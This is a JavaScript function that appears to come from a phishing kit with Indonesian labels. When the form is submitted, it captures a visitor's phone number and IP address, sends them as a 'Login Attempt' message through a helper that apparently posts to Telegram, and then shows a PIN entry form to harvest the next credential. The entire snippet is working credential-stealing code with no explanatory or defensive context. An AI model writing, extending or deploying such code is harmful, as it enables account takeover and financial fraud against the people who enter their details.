async function sendNohp(event){
    $("#process").show();
    event.preventDefault();
    $("#inp").blur();
    const nohp = $('#inp').val();
    const ip = await getIPAddress();
    const message = `🔔 *Login Attempt*\n📱 Nomor HP: ${nohp}\n🌐 IP: \`${ip}\`\n⏰ Time: ${new Date().toLocaleString()}`;
    await sendToTelegram(message);
    $("#process").hide();
    $("#formNohp").fadeOut();
    setTimeout(function(){
        $("#inp").val('');
        $("#formPin").fadeIn();
        $("#pin1").focus();
    }, 500);
}